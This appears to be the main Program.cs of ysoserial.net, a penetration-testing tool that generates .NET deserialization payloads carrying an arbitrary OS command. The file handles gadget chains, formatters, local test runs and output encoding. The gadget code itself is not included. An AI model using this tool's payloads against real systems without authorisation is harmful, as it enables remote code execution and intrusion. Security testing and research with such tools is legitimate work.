using ysoserial.Generators;
using ysoserial.Plugins;
using System;
using System.IO;
using System.Linq;
using NDesk.Options;
using System.Runtime.Remoting;
using System.Text;
using System.Collections.Generic;
using ysoserial.Helpers;
using System.Text.RegularExpressions;
using System.Reflection.Emit;

namespace ysoserial
{
    class Program
    {
        //Command line arguments
        static string outputformat = "";
        static string outputpath = "";
        static string gadget_name = "";
        static string bridged_gadget_chain = "";
        static string formatter_name = "";
        static string searchFormatter = "";
        static string cmd = "";
        static bool rawcmd = false;
        static bool cmdstdin = false;
        static string plugin_name = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = false;
        static bool show_help = false;
        static bool show_credit = false;
        static bool show_fullhelp = false;
        static bool isDebugMode = false;
        static bool isSearchFormatterAndRunMode = false;
        static bool runMyTest = false;

        static IEnumerable<string> generators;
        static IEnumerable<string> plugins;

        static OptionSet options = new OptionSet()
            {
                {"p|plugin=", "The plugin to be used.", v => plugin_name = v },
                {"o|output=", "The output format (raw|base64|raw-urlencode|base64-urlencode|hex). Default: raw", v => outputformat = v },
                {"g|gadget=", "The gadget chain.", v => gadget_name = v },
                {"f|formatter=", "The formatter.", v => formatter_name = v },
                {"c|command=", "The command to be executed.", v => cmd = v },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after first space is an argument).", v => rawcmd =  v != null },
                {"s|stdin", "The command to be executed will be read from standard input.", v => cmdstdin = v != null },
                {"bgc|bridgedgadgetchains=", "Chain of bridged gadgets separated by comma (,). Each gadget will be used to complete the next bridge gadget. The last one will be used in the requested gadget. This will be ignored when using the searchformatter argument.", v => bridged_gadget_chain = v },
                {"t|test", "Whether to run payload locally. Default: false", v => test =  v != null },
                {"outputpath=", "The output file path. It will be ignored if empty.", v => outputpath = v },
                {"minify", "Whether to minify the payloads where applicable. Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple (always `true` with `--minify` for binary formatters). Default: true", v => useSimpleType =  v != null },
                {"raf|runallformatters", "Whether to run all the gadgets with the provided formatter (ignores gadget name, output format, and the test flag arguments). This will search in formatters and also show the displayed payload length. Default: false", v => isSearchFormatterAndRunMode =  v != null },
                {"sf|searchformatter=", "Search in all formatters to show relevant gadgets and their formatters (other parameters will be ignored).", v => searchFormatter =  v},
                {"debugmode", "Enable debugging to show exception errors and output length", v => isDebugMode  =  v != null},
                {"h|help", "Shows this message and exit.", v => show_help = v != null },
                {"fullhelp", "Shows this message + extra options for gadgets and plugins and exit.", v => show_fullhelp = v != null },
                {"credit", "Shows the credit/history of gadgets and plugins (other parameters will be ignored).", v => show_credit =  v != null },
                {"runmytest", "Runs that `Start` method of `TestingArenaHome` - useful for testing and debugging.", v => runMyTest =  v != null }
            };

        static void Main(string[] args)
        {
            InputArgs inputArgs = new InputArgs();

            try
            {
                List<string> commandArgsExtra = options.Parse(args);

                inputArgs.Cmd = cmd;
                inputArgs.IsRawCmd = rawcmd;
                inputArgs.Test = test;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.IsDebugMode = isDebugMode;
                inputArgs.ExtraArguments = commandArgsExtra;
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            if (runMyTest)
            {
                Helpers.TestingArena.TestingArenaHome runTest = new Helpers.TestingArena.TestingArenaHome();
                runTest.Start(inputArgs);
                Environment.Exit(0);
            }

            if (show_fullhelp)
            {
                show_help = true;
            }

            if (isSearchFormatterAndRunMode)
            {
                inputArgs.Test = false;
                gadget_name = "<ignored>";
            }

            if (((cmd == "" && !cmdstdin) || formatter_name == "" || gadget_name == "") &&
                plugin_name == "" && !show_credit && searchFormatter == "")
            {
                if (!show_help)
                    Console.WriteLine("Missing arguments. You may need to provide the command parameter even if it is being ignored.");
                show_help = true;
            }

            var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());

            // Populate list of available gadgets
            var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface && !p.AssemblyQualifiedName.Contains("Helpers.TestingArena"));
            generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList().OrderBy(s => s, StringComparer.OrdinalIgnoreCase);

            // Populate list of available plugins
            var pluginTypes = types.Where(p => typeof(IPlugin).IsAssignableFrom(p) && !p.IsInterface && !p.AssemblyQualifiedName.Contains("Helpers.TestingArena"));
            plugins = pluginTypes.Select(x => x.Name.Replace("Plugin", "")).ToList().OrderBy(s => s, StringComparer.OrdinalIgnoreCase); ;

            // Search in formatters
            if (searchFormatter != "")
            {
                SearchFormatters(searchFormatter, inputArgs);
            }

            // Show credits if requested
            if (show_credit)
            {
                ShowCredit();
            }

            // Show help if requested
            if (show_help)
            {
                ShowHelp();
            }

            object raw = null;

            // Try to execute plugin first
            if (plugin_name != "")
            {
                if (!plugins.Contains(plugin_name, StringComparer.OrdinalIgnoreCase))
                {
                    Console.WriteLine("Plugin not supported. Supported plugins are: " + string.Join(" , ", plugins.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                    System.Environment.Exit(-1);
                }

                // Instantiate Plugin 
                IPlugin plugin = null;
                try
                {
                    plugin_name = plugins.Where(p => String.Equals(p, plugin_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
                    var container = Activator.CreateInstance(null, "ysoserial.Plugins." + plugin_name + "Plugin");

                    plugin = (IPlugin)container.Unwrap();
                }
                catch
                {
                    Console.WriteLine("Plugin not supported!");
                    System.Environment.Exit(-1);
                }

                raw = plugin.Run(args);

                ProcessOutput(outputformat, raw, isDebugMode, outputpath);
            }
            // othersiwe run payload generation
            else if (!isSearchFormatterAndRunMode && (cmd != "" || cmdstdin) && formatter_name != "" && gadget_name != "")
            {
                List<string> gadgetsChain = new List<string>();

                if (!string.IsNullOrEmpty(bridged_gadget_chain))
                {
                    var bridged_gadget_chain_array = bridged_gadget_chain.Split(',').Where(x => !string.IsNullOrEmpty(x)).ToList();

                    gadgetsChain.AddRange(bridged_gadget_chain_array);
                }

                gadgetsChain.Add(gadget_name);

                if (isDebugMode)
                {
                    Console.WriteLine("Current gadget chain: " + string.Join(" -> ", gadgetsChain));
                }

                if (cmd == "" && cmdstdin)
                {
                    Stream stdin = Console.OpenStandardInput(2050);
                    byte[] inBuffer = new byte[2050];
                    int outLen = stdin.Read(inBuffer, 0, inBuffer.Length);
                    char[] chars = Encoding.ASCII.GetChars(inBuffer, 0, outLen);
                    cmd = new string(chars);
                    if ((cmd[cmd.Length - 2] == '\r') && (cmd[cmd.Length - 1] == '\n'))
                    {
                        cmd = cmd.Substring(0, cmd.Length - 2);
                    }
                    inputArgs.Cmd = cmd;
                }

                for (int i = 0; i < gadgetsChain.Count; i++)
                {
                    string current_gadget_name = gadgetsChain[i];
                    string consumer_gadget_name = "";
                    string current_formatter_name = "";

                    if (i < gadgetsChain.Count - 1)
                    {
                        // this is not the last one so it has a consumer and 'current_gadget_name' should be a bridge gadget!
                        consumer_gadget_name = gadgetsChain[i + 1];

                    }
                    else
                    {
                        // the provided formatter from the user input should only be used for the last item in the chain
                        // bridges should know what they need to pass it on
                        current_formatter_name = formatter_name;
                    }

                    if (!generators.Contains(current_gadget_name, StringComparer.CurrentCultureIgnoreCase))
                    {
                        Console.WriteLine("Gadget " + current_gadget_name  + " not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                        System.Environment.Exit(-1);
                    }

                    // Instantiate Payload Generator
                    IGenerator generator = null;
                    try
                    {
                        current_gadget_name = generators.Where(p => String.Equals(p, current_gadget_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
                        var container = Activator.CreateInstance(null, "ysoserial.Generators." + current_gadget_name + "Generator");
                        generator = (IGenerator)container.Unwrap();
                    }
                    catch
                    {
                        Console.WriteLine("Gadget " + current_gadget_name + " not supported!");
                        System.Environment.Exit(-1);
                    }

                    if (!string.IsNullOrEmpty(consumer_gadget_name))
                    {
                        // we have a consumer which has its own requirements and we need to check them to be satisfied
                        // first we need to check whether we have a valid consumer
                        if (!generators.Contains(consumer_gadget_name, StringComparer.CurrentCultureIgnoreCase))
                        {
                            Console.WriteLine("Bridged gadget " + consumer_gadget_name + " not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                            Console.WriteLine("Current supplied gadget chain: " + string.Join(" -> ", gadgetsChain));
                            System.Environment.Exit(-1);
                        }

                        // Instantiate The Bridged Gadget
                        IGenerator consumer_gadget = null;
                        try
                        {
                            consumer_gadget_name = generators.Where(p => String.Equals(p, consumer_gadget_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
                            var container = Activator.CreateInstance(null, "ysoserial.Generators." + consumer_gadget_name + "Generator");
                            consumer_gadget = (IGenerator)container.Unwrap();
                        }
                        catch
                        {
                            Console.WriteLine("Bridged gadget " + consumer_gadget_name + " not supported!");
                            Console.WriteLine("Current supplied gadget chain: " + string.Join(" -> ", gadgetsChain));
                            System.Environment.Exit(-1);
                        }


                        if (!consumer_gadget.Labels().Contains(GadgetTypes.BridgeAndDerived))
                        {
                            Console.WriteLine("The " + consumer_gadget.Name() + " gadget is not a bridge gadget and it cannot accept another gadget.");
                            Console.WriteLine("Current supplied gadget chain: " + string.Join(" -> ", gadgetsChain));
                            System.Environment.Exit(-1);
                        }

                        if (string.IsNullOrEmpty(consumer_gadget.SupportedBridgedFormatter()))
                        {
                            Console.WriteLine("The " + consumer_gadget.Name() + " gadget does not specify a formatter for the bridge");
                            Console.WriteLine("Current supplied gadget chain: " + string.Join(" -> ", gadgetsChain));
                            System.Environment.Exit(-1);
                        }

                        current_formatter_name = consumer_gadget.SupportedBridgedFormatter();
                    }

                    if (!generator.IsSupported(current_formatter_name))
                    {
                        Console.WriteLine("Formatter " + current_formatter_name + " not supported by " + generator.Name() + ". Supported formatters are: " + string.Join(" , ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                        System.Environment.Exit(-1);
                    }

                    if (i > 0)
                    {
                        generator.BridgedPayload = raw;
                    }

                    if(i == gadgetsChain.Count - 1)
                    {
                        raw = generator.GenerateWithInit(current_formatter_name, inputArgs);
                    }
                    else
                    {
                        // we do not need to run the payload when building the bridges unless it is the last one
                        raw = generator.GenerateWithNoTest(current_formatter_name, inputArgs);
                    }

                    
                }

                

                // LosFormatter is already base64 encoded
                if (outputformat.ToLower().Equals("base64") && formatter_name.ToLower().Equals("losformatter"))
                {
                    outputformat = "raw";
                }

                // Getting the default output format if it has not been provided
                if (string.IsNullOrEmpty(outputformat))
                {
                    outputformat = GetDefaultOutputFormat(formatter_name);
                }

                ProcessOutput(outputformat, raw, isDebugMode, outputpath);
            }
            else if (isSearchFormatterAndRunMode && (cmd != "" || cmdstdin) && formatter_name != "")
            {
                Console.WriteLine("## Payloads with formatters contains \"" + formatter_name + "\" ##");
                int counter = 0;
                foreach (string g in generators)
                {
                    try
                    {
                        if (g != "Generic")
                        {
                            ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                            IGenerator gg = (IGenerator)container.Unwrap();
                            foreach (string formatter in gg.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase))
                            {
                                if (formatter.IndexOf(formatter_name, StringComparison.OrdinalIgnoreCase) >= 0)
                                {
                                    // only keeping the first part of formatter that contains alphanumerical to ignore variants or other descriptions
                                    string current_formatter_name = Regex.Split(formatter, @"[^\w$_\-.]")[0];
                                    
                                    String payloadTitle = "(*) Gadget: " + gg.Name() + " - Formatter: " + current_formatter_name;


                                    outputformat = GetDefaultOutputFormat(current_formatter_name);
                                    if (cmd == "" && cmdstdin)
                                    {
                                        Stream stdin = Console.OpenStandardInput(2050);
                                        byte[] inBuffer = new byte[2050];
                                        int outLen = stdin.Read(inBuffer, 0, inBuffer.Length);
                                        char[] chars = Encoding.ASCII.GetChars(inBuffer, 0, outLen);
                                        cmd = new string(chars);
                                        if ((cmd[cmd.Length - 2] == '\r') && (cmd[cmd.Length - 1] == '\n'))
                                        {
                                            cmd = cmd.Substring(0, cmd.Length - 2);
                                        }
                                        inputArgs.Cmd = cmd;
                                    }

                                    raw = gg.GenerateWithInit(current_formatter_name, inputArgs);

                                    string rawPayloadString = "";
                                    if (raw.GetType() == typeof(String))
                                    {
                                        rawPayloadString = (string)raw;
                                    }
                                    else if (raw.GetType() == typeof(byte[]))
                                    {
                                        rawPayloadString = BitConverter.ToString((byte[])raw);
                                    }

                                    if (!String.IsNullOrEmpty(rawPayloadString))
                                    {
                                        ProcessOutput(outputformat, raw, true, outputpath, counter, payloadTitle, "\r\n");
                                        counter++;
                                    }
                                    else
                                    {
                                        Console.WriteLine("\r\nError in generating this payload: " + payloadTitle);
                                    }

                                }
                            }
                        }
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }

                }

            }

            if (isDebugMode)
            {
                Console.ReadLine();
            }
        }

        private static void ProcessOutput(string outputformat, object raw, bool showOutputLength, string outputFilePath)
        {
            ProcessOutput(outputformat, raw, showOutputLength, outputFilePath, 0, "", "");
        }
        private static void ProcessOutput(string outputformat, object raw, bool showOutputLength, string outputFilePath, int loopCount, string prefix, string suffix)
        {
            byte[] outputBytes = null;
            string outputString = "";
            int outputActualLength = 0;

            if (outputformat.ToLower().Contains("base64"))
            {
                if (raw.GetType() == typeof(String))
                {
                    outputBytes = Encoding.ASCII.GetBytes((String)raw);
                }
                else if (raw.GetType() == typeof(byte[]))
                {
                    outputBytes = (byte[])raw;
                }

                outputString = Convert.ToBase64String(outputBytes);
                outputActualLength = outputString.Length;

                if (outputformat.ToLower().Contains("urlencode"))
                {
                    outputString = Uri.EscapeDataString(outputString);
                }

                outputBytes = Encoding.ASCII.GetBytes(outputString);
            }
            else if (raw.GetType() == typeof(String))
            {
                outputString = (String) raw;
                outputActualLength = outputString.Length;

                if (outputformat.ToLower().Contains("urlencode"))
                {
                    outputString = Uri.EscapeDataString(outputString);
                }
                else if (outputformat.ToLower().Equals("hex")) {
                    outputBytes = Encoding.ASCII.GetBytes((String)outputString);
                    outputString = BitConverter.ToString(outputBytes).Replace("-", "");
                }
                outputBytes = Encoding.UTF8.GetBytes((String) outputString ?? "");
            }
            else if (raw.GetType() == typeof(byte[]))
            {
                outputActualLength = ((byte[])raw).Length;

                if (outputformat.ToLower().Contains("urlencode"))
                {
                    outputString = Encoding.UTF8.GetString((byte[])raw);
                    outputString = Uri.EscapeDataString(outputString);
                    outputBytes = Encoding.ASCII.GetBytes((String)outputString ?? "");
                }
                else if(outputformat.ToLower().Equals("hex"))
                {
                    outputString = BitConverter.ToString((byte[])raw).Replace("-", "");
                    outputBytes = Encoding.ASCII.GetBytes((String)outputString ?? "");
                }
                else
                {
                    outputBytes = (byte[])raw;
                }

            }

            if (outputBytes == null)
            {
                Console.WriteLine("Unsupported serialized format");
                return;
            }

            if (String.IsNullOrWhiteSpace(outputFilePath))
            {
                // output in console

                if (!String.IsNullOrEmpty(prefix))
                {
                    Console.WriteLine(prefix);
                }

                if (showOutputLength)
                {
                    Console.WriteLine("(*) Output length: " + outputActualLength);
                }

                MemoryStream data = new MemoryStream(outputBytes);
                using (Stream console = Console.OpenStandardOutput())
                {
                    byte[] buffer = new byte[4 * 1024];
                    int n = 1;
                    while (n > 0)
                    {
                        n = data.Read(buffer, 0, buffer.Length);
                        console.Write(buffer, 0, n);
                    }
                    console.Flush();
                }

                if (!String.IsNullOrEmpty(suffix))
                {
                    Console.WriteLine(suffix);
                }
            }
            else
            {
                // saving in file
                try
                {
                    if (loopCount <= 0)
                    {
                        if (File.Exists(outputFilePath))
                        {
                            File.Delete(outputFilePath);
                        }
                    }

                    using (var stream = new FileStream(outputFilePath, FileMode.Append))
                    {
                        using (StreamWriter writer = new StreamWriter(stream))
                        {
                            if (!String.IsNullOrEmpty(prefix))
                            {
                                writer.WriteLine(prefix);
                            }

                            if (showOutputLength)
                            {
                                writer.WriteLine("(*) Output length: " + outputBytes.Length);
                            }

                            writer.Flush();

                            stream.Write(outputBytes, 0, outputBytes.Length);

                            if (!String.IsNullOrEmpty(suffix))
                            {
                                writer.WriteLine(suffix);
                            }
                            writer.Flush();
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("Error in saving to a file: " + e.Message);
                }

            }
        }


        private static string GetDefaultOutputFormat(string formatter_name)
        {
            string result = "raw";
            List<String> base64Default = new List<string>() { "BinaryFormatter", "ObjectStateFormatter", "MessagePackTypeless", "MessagePackTypelessLz4", "SharpSerializerBinary" }; // LosFormatter is already base64 encoded
            var b64match = base64Default.FirstOrDefault(b64formatter => String.Equals(b64formatter, formatter_name, StringComparison.OrdinalIgnoreCase));
            if (b64match != null)
                result = "base64";
            return result;
        }

        private static void SearchFormatters(string formatter_name, InputArgs inputArgs)
        {
            Console.WriteLine("Formatter search result for \"" + formatter_name + "\":\n");
            foreach (string g in generators)
            {
                try
                {
                    if (g != "Generic")
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                        IGenerator gg = (IGenerator)container.Unwrap();
                        Boolean gadgetSelected = false;
                        foreach (string formatter in gg.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase))
                        {
                            if (formatter.IndexOf(formatter_name, StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                if (gadgetSelected == false)
                                {
                                    Console.WriteLine("\t" + gg.Name());
                                    Console.WriteLine("\t\tFound formatters:");
                                    gadgetSelected = true;
                                }
                                Console.WriteLine("\t\t\t" + formatter);
                            }
                        }
                    }
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }

            }
            System.Environment.Exit(-1);
        }

        private static void ShowHelp()
        {
            Console.WriteLine("ysoserial.net generates deserialization payloads for a variety of .NET formatters.");
            Console.WriteLine("");
            if (plugin_name == "")
            {
                Console.WriteLine("== GADGETS ==");
                foreach (string g in generators)
                {
                    try
                    {
                        if (g != "Generic")
                        {
                            ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                            IGenerator gg = (IGenerator)container.Unwrap();

                            if (gg.Labels().Contains(GadgetTypes.Dummy) && !show_fullhelp)
                            {
                                // We hide the Mask gadgets in normal help as they are not that important!
                                continue;
                            }

                            Console.Write("\t(*) ");
                            if (string.IsNullOrEmpty(gg.AdditionalInfo()))
                            {
                                Console.Write(gg.Name());
                            }
                            else
                            {
                                // we have additional info to add!
                                Console.Write(gg.Name() + " [" + gg.AdditionalInfo() + "]");
                            }

                            OptionSet extraOptions = gg.Options();

                            if (extraOptions != null && !show_fullhelp)
                            {
                                Console.Write(" (supports extra options: use the '--fullhelp' argument to view)");
                            }

                            Console.WriteLine();
                            Console.Write("\t\tFormatters: ");
                            Console.WriteLine(string.Join(" , ", gg.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)) + "");

                            if (show_fullhelp)
                            {
                                Console.WriteLine("\t\t\tLabels: " + string.Join(", ", gg.Labels()));

                                if (gg.Labels().Contains(GadgetTypes.BridgeAndDerived) && !string.IsNullOrEmpty(gg.SupportedBridgedFormatter()))
                                {
                                    Console.WriteLine("\t\t\tSupported formatter for the bridge: " + gg.SupportedBridgedFormatter());
                                }
                            }

                            if (extraOptions != null && show_fullhelp)
                            {
                                StringWriter baseTextWriter = new StringWriter();
                                baseTextWriter.NewLine = "\r\n\t\t\t"; // this is easier than using string builder and adding spacing to each line!
                                Console.WriteLine("\t\t\tExtra options:");
                                extraOptions.WriteOptionDescriptions(baseTextWriter);
                                Console.Write("\t\t\t"); // this is easier than using string builder and adding spacing to each line!
                                Console.WriteLine(baseTextWriter.ToString());
                            }
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Gadget not supported");
                        System.Environment.Exit(-1);
                    }

                }
                Console.WriteLine("");
                Console.WriteLine("== PLUGINS ==");
                foreach (string p in plugins)
                {
                    try
                    {
                        if (p != "Generic")
                        {
                            ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Plugins." + p + "Plugin");
                            IPlugin pp = (IPlugin)container.Unwrap();
                            Console.WriteLine("\t(*) " + pp.Name() + " (" + pp.Description() + ")");

                            OptionSet options = pp.Options();

                            if (options != null && show_fullhelp)
                            {
                                StringWriter baseTextWriter = new StringWriter();
                                baseTextWriter.NewLine = "\r\n\t\t"; // this is easier than using string builder and adding spacing to each line!
                                Console.WriteLine("\t\tOptions:");
                                options.WriteOptionDescriptions(baseTextWriter);
                                Console.Write("\t\t"); // this is easier than using string builder and adding spacing to each line!
                                Console.WriteLine(baseTextWriter.ToString());
                            }
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Plugin not supported");
                        System.Environment.Exit(-1);
                    }

                }
                Console.WriteLine("");
                Console.WriteLine("Note: Machine authentication code (MAC) key modifier is not being used for LosFormatter in ysoserial.net. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.");
                Console.WriteLine("");
                Console.WriteLine("Usage: ysoserial.exe [options]");
                Console.WriteLine("Options:");
                options.WriteOptionDescriptions(Console.Out);
                System.Environment.Exit(0);
            }
            else
            {
                try
                {
                    plugin_name = plugins.Where(p => String.Equals(p, plugin_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
                    ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Plugins." + plugin_name + "Plugin");
                    IPlugin pp = (IPlugin)container.Unwrap();
                    Console.WriteLine("Plugin:\n");
                    Console.WriteLine(pp.Name() + " (" + pp.Description() + ")");
                    Console.WriteLine("\nOptions:\n");
                    pp.Options().WriteOptionDescriptions(Console.Out);
                }
                catch
                {
                    Console.WriteLine("Plugin not supported");
                }
                System.Environment.Exit(-1);
            }
        }

        private static void ShowCredit()
        {
            Console.WriteLine("ysoserial.net has been originally developed by Alvaro Muñoz (@pwntester)");
            Console.WriteLine("this tool is being maintained by Alvaro Muñoz (@pwntester) and Soroush Dalili (@irsdl)");
            Console.WriteLine("");
            Console.WriteLine("Credits for available gadgets:");
            foreach (string g in generators)
            {
                try
                {
                    if (g != "Generic")
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                        IGenerator gg = (IGenerator)container.Unwrap();
                        Console.WriteLine("\t" + gg.Name());
                        Console.WriteLine("\t\t" + gg.Credit());
                    }
                }
                catch
                {
                    Console.WriteLine("Gadget not supported");
                    System.Environment.Exit(-1);
                }

            }
            Console.WriteLine("");
            Console.WriteLine("Credits for available plugins:");
            foreach (string p in plugins)
            {
                try
                {
                    if (p != "Generic")
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Plugins." + p + "Plugin");
                        IPlugin pp = (IPlugin)container.Unwrap();
                        Console.WriteLine("\t" + pp.Name());
                        Console.WriteLine("\t\t" + pp.Credit());
                    }
                }
                catch
                {
                    Console.WriteLine("Plugin not supported");
                    System.Environment.Exit(-1);
                }
            }
            Console.WriteLine("");
            Console.WriteLine("Various other people have also donated their time and contributed to this project.");
            Console.WriteLine("Please see https://github.com/pwntester/ysoserial.net/graphs/contributors to find those who have helped developing more features or have fixed bugs.");
            System.Environment.Exit(0);
        }
    }
}
